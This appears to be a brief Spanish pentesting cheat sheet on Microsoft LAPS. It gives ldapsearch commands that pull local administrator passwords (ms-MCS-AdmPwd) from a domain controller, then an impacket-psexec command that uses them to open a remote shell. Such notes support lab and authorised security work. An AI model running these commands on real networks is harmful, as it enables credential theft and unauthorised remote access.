# LAPS 

Tags: #Windows #LAPS 

**LAPS (Local Administrator Password Solution)** es una solución de Microsoft que gestiona **automáticamente las contraseñas de administrador local** en máquinas Windows unidas a dominio.

```bash 
# Ruta de instalación
C:\Program Files\LAPS 
```

## LAPS 
```bash 
# Extraer la apassword del usuario Administrator 
❯ ldapsearch -x -H 'ldap://IP_DC' -D 'Domain\user' -w 'P@$$w0rd123!' -b 'dc=Domain,dc=corp' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

❯ ldapsearch -x -H 'ldap://IP_DC' -D 'user@Domain.corp' -w 'P@$$w0rd123!' -b 'dc=Domain,dc=corp' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

NOTA:
	- LDAP necesita el NetBIOS 'Domain' o FQDN 'Domain.corp'  
```

```bash 
❯ impacket-psexec Domain.corp/Administrator:'AdminP@$$w0rd123!'@<IP> cmd.exe
```